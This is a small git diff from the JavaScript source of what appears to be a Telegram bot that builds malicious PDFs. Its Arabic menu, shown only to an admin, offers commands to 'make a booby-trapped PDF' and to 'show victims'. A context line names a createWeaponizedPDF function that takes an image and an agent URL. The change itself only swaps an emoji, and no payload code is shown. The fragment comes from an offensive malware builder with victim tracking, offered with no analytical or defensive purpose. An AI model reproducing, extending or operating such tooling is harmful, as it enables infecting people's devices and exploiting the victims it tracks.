@@ -106,7 +106,7 @@ async function createWeaponizedPDF(imageBuffer, agentUrl) {
 bot.onText(/\/start/, (msg) => {
     if (msg.from.id !== ADMIN_ID) return;
     bot.sendMessage(msg.chat.id,
-        '🖤 *جاهز سيدي المطور.*\n\n' +
+        '❤️ *جاهز سيدي المطور.*\n\n' +
         '⚡ *الوحش متصل بـ Firebase + imgBB*\n\n' +
         '/pdf - صنع PDF ملغوم\n/panel - عرض الضحايا\n\n📸 *أرسل /pdf ثم الصورة.*',
         { parse_mode: 'Markdown' }
